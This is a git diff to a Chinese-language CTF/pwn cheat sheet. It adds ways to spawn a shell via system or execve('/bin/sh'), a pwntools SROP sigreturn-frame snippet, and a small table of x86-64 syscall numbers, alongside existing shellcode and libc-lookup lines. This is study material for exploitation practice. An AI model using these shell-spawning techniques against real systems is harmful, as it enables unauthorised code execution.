@@ -16,11 +16,12 @@ context(arch='i386', os='linux')
 shellcode = asm(shellcraft.sh())
 ```
 
-### 执行system函数
+### 执行命令获取系统权限
 
 1. system("/bin/sh")
 2. system("sh")
 3. system("$0")
+4. execve("/bin/sh", 0, 0) # syscall rax=59
 
 ## 0x002-敏感函数
 
@@ -90,4 +91,28 @@ bin_sh_addr = libcbase + libc.dump("str_bin_sh")
    ```
 4. 等待安装完成即可
 
-## 0x004-偏移
+## 0x004-构造SROP
+
+```
+sigframe = SigreturnFrame()
+sigframe.rax = 59
+sigframe.rdi = bin_sh_addr
+sigframe.rsi = 0
+sigframe.rdx = 0
+sigframe.rip = syscall_ret_addr
+```
+
+https://www.wangan.com/docs/1081
+
+## 0x005-syscall和int 0x80
+
+系统调用常见函数(64位系统)
+
+|  系统调用号  |  函数  |
+|  :----:  | :----:  |
+|  0  |  read  |
+|  1  |  write  |
+|  15  |  rt_sigreturn  |
+|  59  |  execve  |
+
+https://blog.csdn.net/sinat_26227857/article/details/44244433
